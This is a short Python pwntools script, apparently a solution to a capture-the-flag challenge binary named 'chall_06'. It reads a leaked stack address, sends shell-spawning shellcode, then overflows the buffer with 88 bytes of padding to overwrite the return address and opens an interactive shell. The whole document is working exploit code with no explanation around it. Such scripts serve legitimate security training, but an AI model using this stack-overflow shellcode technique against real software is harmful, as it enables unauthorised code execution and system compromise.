from pwn import *
p=process("./chall_06")
p.recvuntil(":")
var50h = p.recv()
var50h = int(var50h, 16)
context.arch="amd64"
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.sendline(b's'*88+p64(var50h))
p.interactive()
